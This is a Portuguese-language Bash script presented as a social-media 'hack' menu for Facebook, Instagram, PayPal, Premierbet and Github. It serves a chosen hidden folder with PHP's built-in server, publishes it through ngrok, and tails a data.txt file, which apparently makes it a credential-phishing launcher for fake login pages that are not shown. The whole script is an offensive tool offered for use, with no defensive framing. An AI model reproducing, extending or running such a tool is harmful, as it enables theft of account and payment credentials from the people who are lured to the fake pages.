#!/usr/bin/env bash

#------------------------------------------#
# Script Principal
#------------------------------------------#

clear

# Definição de cores
r='\033[0;31m'  # Vermelho
g='\033[0;32m'  # Verde
b='\033[0;34m'  # Azul
y='\033[1;33m'  # Amarelo
w='\033[0;37m'  # Branco
B='\033[1m'     # Negrito
reset='\033[0m' # Resetar cor

#------------------------------------------#
echo -e "${B}${y}Bem-vindo(a) $(whoami)${reset}"
echo -e "${B}${g}"
echo "‹⟨ Hack de redes sociais ⟩›"
echo "1. Facebook"
echo "2. Instagram"
echo "3. PayPal"
echo "4. Premierbet"
echo "5. Github"
echo -e "${reset}"
#------------------------------------------#

# Receber opções e porta
read -p "$(echo -e "${y}⟨ Selecione uma opção ⟩ ${reset}")" opt
read -p "$(echo -e "⟨ Porta para rodar o serviço ⟩ ${reset}")" port

# Verificação de entrada
if [[ -z $opt || -z $port ]]; then
    echo -e "${r}Erro fatal!${reset}"
    exit 1
fi

# Funções para cada serviço
function start_service() {
    local service=$1
    if [[ -d .$service ]]; then
        clear
        cd .$service || exit
        echo -e "${g}Rodando $service em localhost:$port${reset}"
        echo "" >> data.txt

        # Iniciar PHP e ngrok em paralelo
        tail -f data.txt & php -S localhost:$port & ngrok http $port
    else
        echo -e "${r}Erro 404: Diretório .$service não encontrado.${reset}"
    fi
}

# Escolha do usuário
case $opt in
    1) start_service "facebook" ;;
    2) start_service "instagram" ;;
    3) start_service "paypal" ;;
    4) start_service "premierbet" ;;
    5) start_service "github" ;;
    *) echo -e "${r}Opção inexistente!${reset}" ;;
esac
